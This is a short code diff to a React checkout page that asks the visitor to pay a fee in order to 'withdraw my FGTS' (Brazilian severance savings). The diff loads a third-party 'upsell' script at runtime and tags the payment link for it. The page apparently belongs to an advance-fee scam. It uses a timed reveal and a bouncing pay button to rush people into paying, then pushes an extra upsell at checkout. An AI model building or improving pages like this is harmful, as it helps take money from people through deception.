@@ -23,6 +23,18 @@ export function PagamentoTarifa() {
     const [, setIsVisible] = useState(false);
 
     useEffect(() => {
+        // Adicionar o script do upsell dinamicamente
+        const script = document.createElement("script");
+        script.src = "https://www.iexperience-app.com/oneclick.js";
+        script.async = true;
+        document.body.appendChild(script);
+
+        return () => {
+            document.body.removeChild(script);
+        };
+    }, []);
+
+    useEffect(() => {
         const SECONDS_TO_DISPLAY = 44;
 
         let attempts = 0;
@@ -164,7 +176,10 @@ export function PagamentoTarifa() {
                     <p className="text-6xl font-semibold text-green-600">R$ {displayedAmount.toFixed(2)}</p>
                 </div>
 
-                <a href="https://pay.iexperience-app.com/f31d1b15" className="w-full">
+                <a
+                    href="https://pay.iexperience-app.com/f31d1b15"
+                    className="w-full iexperience-upsell"
+                >
                     <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3 text-2xl">
                         PAGAR TAXA E SACAR MEU FGTS
                     </button>
